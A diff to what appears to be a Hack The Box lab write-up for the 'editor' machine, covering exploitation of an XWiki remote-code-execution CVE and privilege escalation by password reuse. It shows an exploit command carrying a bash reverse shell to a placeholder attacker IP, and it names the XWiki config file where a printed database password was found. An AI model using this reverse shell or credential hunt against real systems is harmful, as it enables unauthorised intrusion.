@@ -67,6 +67,24 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ###  CVE-2025-24893 - XWiki RCE
 - Exploit Used: https://github.com/gunzf0x/CVE-2025-24893
 
-bash ```
+ ``` bash
 python3 exploit.py -t http://editor.htb:8080 -c 'bash -i >& /dev/tcp/<YOuR_IP>/4444 0>&1'
 ```
+
+
+## 🔼 Privilege Escalation: User
+
+### 🔑 Password Reuse
+
+Database credentials were found in the XWiki configuration file.  
+
+**Location:**  
+``` bash 
+/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml 
+```
+
+**Credentials:**
+```xml
+<property name="hibernate.connection.password">theEd1t0rTeam99</property>
+
+
